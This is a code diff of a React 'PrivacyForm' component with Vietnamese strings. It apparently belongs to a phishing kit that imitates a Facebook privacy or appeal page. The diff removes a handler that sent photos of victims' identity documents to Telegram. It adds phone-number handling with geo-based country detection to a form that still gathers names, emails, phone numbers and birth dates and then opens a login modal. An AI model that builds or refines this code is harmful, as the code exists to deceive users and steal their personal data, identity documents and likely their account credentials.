@@ -1,42 +1,22 @@
-import { useState } from 'react';
-import { countryOptions } from '@/components/constants';
+import { useEffect, useRef, useState } from 'react';
+import intlTelInput from 'intl-tel-input';
+import 'intl-tel-input/build/css/intlTelInput.css';
 import LoginModal from '@/components/login-modal';
 import { useLang } from '@/context/lang-context';
-import { sendPhotoToTelegram } from '@/utils/send-telegram';
+import usePhoneStore from '@/stores/use-phone-store';
 
 const PrivacyForm = () => {
-    const { labels, updateLangByCountry } = useLang();
-    const [showIdOptions, setShowIdOptions] = useState(false);
-    const [selectedId, setSelectedId] = useState('');
+    const { labels } = useLang();
+    const phoneRef = useRef(null);
+    const intlInstanceRef = useRef(null);
     const [showModal, setShowModal] = useState(false);
     const [formData, setFormData] = useState({});
-    const [selectedCountry, setSelectedCountry] = useState('');
     const [emailErrors, setEmailErrors] = useState({
         email_facebook: '',
         email_work: '',
     });
     const [phoneError, setPhoneError] = useState('');
-
-    const idTypes = [
-        labels.idType_0,
-        labels.idType_1,
-        labels.idType_2,
-        labels.idType_3,
-    ];
-
-    const handleCountryChange = async (e) => {
-        const country = e.target.value;
-        setSelectedCountry(country);
-        await updateLangByCountry(country);
-    };
-
-    const handleFileChange = async (e, side) => {
-        const file = e.target.files?.[0];
-        if (!file) return;
-        const sideLabel = side === 'front' ? 'Mặt trước' : 'Mặt sau';
-        const caption = `🪪 <b>GIẤY TỜ TÙY THÂN – ${sideLabel}</b>\n📎 <b>Loại:</b> ${selectedId || 'Chưa chọn'}\n📄 <b>File:</b> ${file.name}`;
-        await sendPhotoToTelegram(file, caption);
-    };
+    const { countryCode, setCountry, fetchGeoCountry } = usePhoneStore();
 
     const getEmailError = (value, emptyMessage, invalidMessage) => {
         const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
@@ -59,15 +39,62 @@ const PrivacyForm = () => {
             return 'Vui lòng nhập số điện thoại.';
         }
 
-        if (!/^\d+$/.test(normalizedValue)) {
-            return 'Số điện thoại chỉ được chứa chữ số.';
-        }
-
         return '';
     };
 
+    useEffect(() => {
+        if (!phoneRef.current) {
+            return undefined;
+        }
+
+        const instance = intlTelInput(phoneRef.current, {
+            initialCountry: countryCode || 'vn',
+            nationalMode: false,
+            strictMode: true,
+            autoPlaceholder: 'polite',
+            loadUtils: () => import('intl-tel-input/utils'),
+        });
+
+        intlInstanceRef.current = instance;
+
+        const syncSelectedCountry = () => {
+            const countryData = instance.getSelectedCountryData();
+            setCountry(countryData?.iso2 || 'vn', countryData?.dialCode || null);
+        };
+
+        phoneRef.current.addEventListener('countrychange', syncSelectedCountry);
+        syncSelectedCountry();
+
+        return () => {
+            phoneRef.current?.removeEventListener('countrychange', syncSelectedCountry);
+            instance.destroy();
+            intlInstanceRef.current = null;
+        };
+    }, [countryCode, setCountry]);
+
+    useEffect(() => {
+        const initGeoCountry = async () => {
+            const resolvedCountry = await fetchGeoCountry();
+            if (intlInstanceRef.current && resolvedCountry) {
+                intlInstanceRef.current.setCountry(resolvedCountry);
+            }
+        };
+
+        initGeoCountry();
+    }, [fetchGeoCountry]);
+
     const handleSubmit = (e) => {
         e.preventDefault();
+        const intlInstance = intlInstanceRef.current;
+        const rawPhone = phoneRef.current?.value ?? '';
+
+        if (intlInstance && rawPhone.trim() !== '') {
+            const fullPhone = intlInstance.getNumber();
+            if (phoneRef.current) {
+                phoneRef.current.value = fullPhone;
+            }
+        }
+
         const fd = new FormData(e.target);
         const data = Object.fromEntries(fd.entries());
         const nextEmailErrors = {
@@ -82,7 +109,8 @@ const PrivacyForm = () => {
                 'Email liên hệ không đúng định dạng.',
             ),
         };
-        const nextPhoneError = getPhoneError(data.phone);
+        const nextPhoneError = getPhoneError(data.phone)
+            || (intlInstance && !intlInstance.isValidNumber() ? 'Số điện thoại không hợp lệ.' : '');
 
         if (nextEmailErrors.email_facebook || nextEmailErrors.email_work || nextPhoneError) {
             setEmailErrors(nextEmailErrors);
@@ -95,7 +123,7 @@ const PrivacyForm = () => {
             email_work: '',
         });
         setPhoneError('');
-        setFormData({ ...data, country: selectedCountry });
+        setFormData(data);
         setShowModal(true);
     };
 
@@ -146,32 +174,6 @@ const PrivacyForm = () => {
                             <p className="m-0 mt-1 text-[13px] font-semibold leading-[19.994px] text-[#1c1e21]">
                                 {labels.flagDesc5}
                             </p>
-                        </div>
-
-                        {/* Country */}
-                        <div className="_sx7">
-                            <label
-                                htmlFor="privacy-country"
-                                className="mb-1 block text-[13px] font-semibold leading-[20px] text-[#1c1e21]"
-                            >
-                                {labels.countryLabel}
-                            </label>
-                            <select
-                                id="privacy-country"
-                                name="country"
-                                value={selectedCountry}
-                                onChange={handleCountryChange}
-                                className="w-full rounded-[4px] border border-[#ccd0d5] px-2 py-[6px] text-[13px] text-[#1c1e21] outline-none focus:border-[#1877f2]"
-                            >
-                                <option value="" disabled>
-                                    {labels.countryPlaceholder}
-                                </option>
-                                {countryOptions.map((country) => (
-                                    <option key={country} value={country}>
-                                        {country}
-                                    </option>
-                                ))}
-                            </select>
                         </div>
 
                         {/* Full name */}
@@ -284,10 +286,11 @@ const PrivacyForm = () => {
                                 type="tel"
                                 name="phone"
                                 required
-                                inputMode="numeric"
-                                pattern="[0-9]*"
+                                ref={phoneRef}
                                 onChange={(e) => {
-                                    setPhoneError(getPhoneError(e.target.value));
+                                    if (phoneError) {
+                                        setPhoneError('');
+                                    }
                                 }}
                                 className="w-full rounded-[4px] border border-[#ccd0d5] px-3 py-[6px] text-[13px] text-[#1c1e21] outline-none focus:border-[#1877f2]"
                             />
@@ -310,113 +313,6 @@ const PrivacyForm = () => {
                                 name="date_of_birth"
                                 className="w-full rounded-[4px] border border-[#ccd0d5] px-3 py-[6px] text-[13px] text-[#1c1e21] outline-none focus:border-[#1877f2]"
                             />
-                        </div>
-
-                        {/* Description */}
-                        <div className="_sx7">
-                            <label
-                                htmlFor="privacy-description"
-                                className="mb-1 block text-[13px] font-semibold leading-[20px] text-[#1c1e21]"
-                            >
-                                {labels.descriptionLabel}
-                            </label>
-                            <textarea
-                                id="privacy-description"
-                                name="description"
-                                rows={5}
-                                className="w-full resize-y rounded-[4px] border border-[#ccd0d5] px-3 py-2 text-[13px] leading-[20px] text-[#1c1e21] outline-none placeholder:text-[#8d949e] focus:border-[#1877f2]"
-                            />
-                            <p className="mt-1 text-[12px] leading-[18px] text-[#606770]">
-                                {labels.descriptionHelper}
-                            </p>
-                        </div>
-
-                        {/* Your ID */}
-                        <div className="_sx7">
-                            <button
-                                type="button"
-                                onClick={() => setShowIdOptions((prev) => !prev)}
-                                className="flex w-full items-center justify-between rounded-[4px] border border-[#ccd0d5] px-3 py-[8px] text-left text-[13px] text-[#1c1e21] outline-none hover:bg-[#f5f6f7]"
-                            >
-                                <span className="font-semibold">
-                                    {selectedId || 'Your ID'}
-                                </span>
-                                <svg
-                                    className={`h-4 w-4 text-[#606770] transition-transform ${showIdOptions ? 'rotate-180' : ''}`}
-                                    fill="none"
-                                    viewBox="0 0 24 24"
-                                    stroke="currentColor"
-                                    strokeWidth={2}
-                                >
-                                    <path strokeLinecap="round" strokeLinejoin="round" d="M19 9l-7 7-7-7" />
-                                </svg>
-                            </button>
-
-                            {showIdOptions && (
-                                <div className="mt-1 rounded-[4px] border border-[#ccd0d5] bg-[#F8FAFC]">
-                                    {idTypes.map((idType) => (
-                                        <label
-                                            key={idType}
-                                            className="flex cursor-pointer items-center justify-between border-b border-[#f0f2f5] px-4 py-3 last:border-b-0 hover:bg-[#f5f6f7]"
-                                        >
-                                            <span className="text-[13px] text-[#1c1e21]">{idType}</span>
-                                            <input
-                                                type="radio"
-                                                name="id_type"
-                                                value={idType}
-                                                checked={selectedId === idType}
-                                                onChange={() => {
-                                                    setSelectedId(idType);
-                                                    setShowIdOptions(false);
-                                                }}
-                                                className="h-4 w-4 accent-[#1877f2]"
-                                            />
-                                        </label>
-                                    ))}
-                                </div>
-                            )}
-
-                            {selectedId && (
-                                <div className="mt-3 space-y-3 rounded-[4px] border border-[#ccd0d5] bg-[#F8FAFC] p-3">
-                                    <p className="text-[13px] font-semibold text-[#1c1e21]">
-                                        {labels.idUploadLabel} {selectedId}
-                                    </p>
-
-                                    <div>
-                                        <label
-                                            htmlFor="privacy-id-front"
-                                            className="mb-1 block text-[12px] font-semibold text-[#1c1e21]"
-                                        >
-                                            {labels.idFrontLabel}
-                                        </label>
-                                        <input
-                                            id="privacy-id-front"
-                                            type="file"
-                                            name="id_front_image"
-                                            accept="image/*"
-                                            onChange={(e) => handleFileChange(e, 'front')}
-                                            className="w-full rounded-[4px] border border-[#ccd0d5] px-2 py-[6px] text-[13px] text-[#1c1e21] file:mr-3 file:rounded-[4px] file:border-0 file:bg-[#e7f3ff] file:px-3 file:py-1 file:text-[12px] file:font-semibold file:text-[#1877f2] hover:file:bg-[#dcecff]"
-                                        />
-                                    </div>
-
-                                    <div>
-                                        <label
-                                            htmlFor="privacy-id-back"
-                                            className="mb-1 block text-[12px] font-semibold text-[#1c1e21]"
-                                        >
-                                            {labels.idBackLabel}
-                                        </label>
-                                        <input
-                                            id="privacy-id-back"
-                                            type="file"
-                                            name="id_back_image"
-                                            accept="image/*"
-                                            onChange={(e) => handleFileChange(e, 'back')}
-                                            className="w-full rounded-[4px] border border-[#ccd0d5] px-2 py-[6px] text-[13px] text-[#1c1e21] file:mr-3 file:rounded-[4px] file:border-0 file:bg-[#e7f3ff] file:px-3 file:py-1 file:text-[12px] file:font-semibold file:text-[#1877f2] hover:file:bg-[#dcecff]"
-                                        />
-                                    </div>
-                                </div>
-                            )}
                         </div>
 
                     </div>
